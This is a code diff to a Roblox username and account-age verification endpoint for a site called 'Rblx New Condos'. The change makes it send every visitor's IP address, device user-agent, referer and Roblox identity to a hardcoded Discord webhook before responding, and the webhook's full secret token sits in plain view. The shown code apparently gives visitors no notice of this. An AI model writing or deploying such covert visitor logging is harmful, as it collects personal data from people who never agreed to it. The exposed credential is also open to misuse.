@@ -6,124 +6,89 @@
  * - GET /api/verify?userId=X    -> Get user profile by ID (cached)
  * - GET /api/verify?avatarId=X  -> Get user avatar by ID (cached)
  * 
- * Features:
- * - In-memory cache (TTL 30 min) to avoid redundant Roblox API calls
- * - Optimized: full verification uses POST /v1/usernames/users (1 call instead of 3)
- * - Exponential backoff retry for 429 rate limits
- * - Staggered fetch to avoid rate limiting
- * - Robust logging: queued Discord webhook with retry + delay
+ * Logging:
+ * - When username is provided: sends ONE complete log BEFORE responding
+ * - Log includes: entrance info + verification result (unified)
+ * - Synchronous send with retry to ensure delivery
  */
 
 const MIN_ACCOUNT_DAYS = 80;
 const CACHE_TTL = 30 * 60 * 1000; // 30 minutes
 const WEBHOOK_URL = 'https://discord.com/api/webhooks/1524874777947410513/Ng_v8NSNotO1CPGcDhWbYGiwdgzcGrv0h_-Lkv2D_vxQvJ_rorAooUFlSML-tgc6Qm_A';
 
-// ── Log queue (prevents webhook rate limits & lost logs) ──
-const logQueue = [];
-let logProcessing = false;
-
-async function processLogQueue() {
-  if (logProcessing || logQueue.length === 0) return;
-  logProcessing = true;
-
-  while (logQueue.length > 0) {
-    const logData = logQueue.shift();
-    try {
-      const response = await fetch(WEBHOOK_URL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ embeds: [logData.embed] }),
-      });
-
-      // If rate limited, put back in queue and wait longer
-      if (response.status === 429) {
-        const retryAfter = response.headers.get('retry-after') || 1;
-        await new Promise(r => setTimeout(r, retryAfter * 1000 + 1000));
-        logQueue.unshift(logData);
-        continue;
-      }
-
-      // Delay between sends to avoid rate limiting (2.5s gap)
-      await new Promise(r => setTimeout(r, 2500));
-    } catch (err) {
-      // If fetch fails, retry after delay
-      await new Promise(r => setTimeout(r, 3000));
-    }
-  }
-
-  logProcessing = false;
-}
-
-function sendLog(data) {
-  // Build a single complete embed with all info
+// ── Synchronous log sender (waits for delivery before responding) ──
+async function sendLogSynchronous(data) {
   const statusEmoji = data.accountAgeOk ? '✅' : data.found ? '🚫' : '❌';
   const statusText = data.accountAgeOk ? 'Verified (80+ days)' : data.found ? 'Blocked (< 80 days)' : 'Not Found';
   const color = data.accountAgeOk ? 0x22c55e : data.found ? 0xf97316 : 0xef4444;
 
   const fields = [];
 
-  // ── Status field ──
+  // ── Core info ──
   fields.push({ name: 'Status', value: `${statusEmoji} **${statusText}**`, inline: true });
-
-  // ── Username field ──
   fields.push({ name: 'Username', value: data.username || 'unknown', inline: true });
 
-  // ── Display Name (if found) ──
   if (data.displayName) {
     fields.push({ name: 'Display Name', value: data.displayName, inline: true });
   }
-
-  // ── User ID (if found) ──
   if (data.userId) {
     fields.push({ name: 'User ID', value: data.userId.toString(), inline: true });
   }
-
-  // ── Account Age (if found) ──
   if (data.daysOld !== undefined) {
     fields.push({ name: 'Account Age', value: `${data.daysOld} days`, inline: true });
   }
-
-  // ── Created Date (if found) ──
   if (data.createdFormatted) {
     fields.push({ name: 'Created', value: data.createdFormatted, inline: true });
   }
-
-  // ── Verified Badge ──
   if (data.hasVerifiedBadge !== undefined) {
     fields.push({ name: 'Verified Badge', value: data.hasVerifiedBadge ? 'Yes ✅' : 'No ❌', inline: true });
   }
 
-  // ── IP Address ──
+  // ── Client info ──
   fields.push({ name: 'IP Address', value: data.ip || 'unknown', inline: true });
-
-  // ── User-Agent ──
   if (data.userAgent) {
-    const ua = data.userAgent.substring(0, 120);
-    fields.push({ name: 'User-Agent', value: `\`${ua}\``, inline: false });
+    const ua = data.userAgent.substring(0, 100);
+    fields.push({ name: 'Device', value: `\`${ua}\``, inline: false });
   }
-
-  // ── Referer ──
   if (data.referer) {
     fields.push({ name: 'Source', value: data.referer, inline: true });
   }
-
-  // ── Timestamp ──
   fields.push({ name: 'Time', value: data.time || new Date().toISOString(), inline: true });
 
   const embed = {
-    title: '🔍 Profile Verification Attempt',
+    title: '🔍 Profile Verification',
+    description: '**New visitor entered the site and attempted profile verification.**\nAll information captured in a single log.',
     color: color,
     fields: fields,
     footer: { text: 'Rblx New Condos — Verification Log' },
     timestamp: new Date().toISOString(),
   };
 
-  logQueue.push({ embed });
+  // Send synchronously with retry (max 3 attempts)
+  for (let attempt = 0; attempt < 3; attempt++) {
+    try {
+      const response = await fetch(WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ embeds: [embed] }),
+      });
 
-  // Start processing queue (non-blocking)
-  if (!logProcessing) {
-    processLogQueue();
+      if (response.status === 429) {
+        const retryAfter = response.headers.get('retry-after') || '2';
+        await new Promise(r => setTimeout(r, parseInt(retryAfter) * 1000 + 500));
+        continue;
+      }
+
+      if (response.ok) {
+        return true; // Log sent successfully
+      }
+    } catch (err) {
+      if (attempt < 2) {
+        await new Promise(r => setTimeout(r, 2000));
+      }
+    }
   }
+  return false; // Failed to send log
 }
 
 // ── In-memory cache ──
@@ -195,7 +160,7 @@ module.exports = async function(req, res) {
 
   const { username, userId, avatarId } = req.query;
 
-  // Extract client info for logs
+  // Extract client info
   const clientInfo = {
     ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown',
     userAgent: req.headers['user-agent'] || 'unknown',
@@ -204,13 +169,14 @@ module.exports = async function(req, res) {
   };
 
   try {
-    // ── Full verification: search + profile + avatar ──
+    // ── Full verification: only sends log when username is provided ──
     if (username) {
       const cacheKey = 'username:' + username.toLowerCase();
       const cached = getCached(cacheKey);
+
+      // If cached, just send log and return immediately (no extra API calls)
       if (cached) {
-        // Still log cached hits
-        sendLog({
+        sendLogSynchronous({
           ...clientInfo,
           username: username,
           displayName: cached.displayName || cached.name,
@@ -242,8 +208,8 @@ module.exports = async function(req, res) {
       const searchData = await searchResponse.json();
       
       if (!searchData.data || searchData.data.length === 0) {
-        // Log: user not found
-        sendLog({
+        // User not found — send log then respond
+        sendLogSynchronous({
           ...clientInfo,
           username: username,
           found: false,
@@ -320,8 +286,8 @@ module.exports = async function(req, res) {
 
       setCached(cacheKey, result);
 
-      // Log: user found (verified or blocked)
-      sendLog({
+      // Send ONE unified log with all info BEFORE responding
+      sendLogSynchronous({
         ...clientInfo,
         username: profile.name,
         displayName: profile.displayName,
@@ -336,7 +302,7 @@ module.exports = async function(req, res) {
       return res.status(200).json(result);
     }
 
-    // ── Get user profile by ID ──
+    // ── Get user profile by ID (no log for direct ID calls) ──
     if (userId) {
       const cacheKey = 'user:' + userId;
       const cached = getCached(cacheKey);
@@ -400,7 +366,7 @@ module.exports = async function(req, res) {
       });
     }
 
-    // ── Get avatar by user ID ──
+    // ── Get avatar by user ID (no log) ──
     if (avatarId) {
       const cacheKey = 'avatar:' + avatarId;
       const cached = getCached(cacheKey);
